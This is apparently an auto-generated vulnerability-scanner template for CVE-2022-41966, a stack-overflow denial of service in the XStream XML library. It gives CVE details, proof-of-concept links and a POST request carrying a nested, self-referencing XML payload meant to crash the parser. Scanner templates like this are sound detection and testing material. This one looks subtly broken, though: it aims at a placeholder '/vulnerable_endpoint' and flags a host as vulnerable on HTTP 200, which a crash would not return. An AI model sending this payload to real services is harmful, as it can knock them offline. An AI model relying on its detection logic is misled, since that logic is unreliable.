id: CVE-2022-41966

info:
  name: XStream Denial of Service via Stack Overflow
  author: ProjectDiscoveryAI
  severity: high
  description: XStream serializes Java objects to XML and back again. Versions prior to 1.4.20 may allow a remote attacker to terminate the application with a stack overflow error, resulting in a denial of service only via manipulation the processed input stream.
  impact: |
    Successful exploitation could lead to a denial of service condition.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://github.com/x-stream/xstream/security/advisories/GHSA-j563-grx4-pjpv
    - https://security.netapp.com/advisory/ntap-20230216-0005/
    - https://github.com/manas3c/CVE-POC
    - https://github.com/muneebaashiq/MBProjects
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
    cvss-score: 8.2
    cve-id: CVE-2022-41966
    cwe-id: CWE-120,CWE-674
    epss-score: 0.01002
    epss-percentile: 0.8425
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
  metadata:
    vendor: xstream_project
    product: xstream

http:
  - method: POST
    path:
      - "{{BaseURL}}/vulnerable_endpoint"

    headers:
      Content-Type: application/xml

    body: |
      <set>
        <set>
          <set>
            <set>
              <set>
                <set>
                  <set>
                    <string>a</string>
                  </set>
                  <set>
                    <string>b</string>
                  </set>
                </set>
                <set>
                  <string>c</string>
                  <set reference='../../../set/set[2]'/>
                </set>
              </set>
            </set>
          </set>
        </set>
      </set>
    matchers:
      - type: status
        status:
          - 200
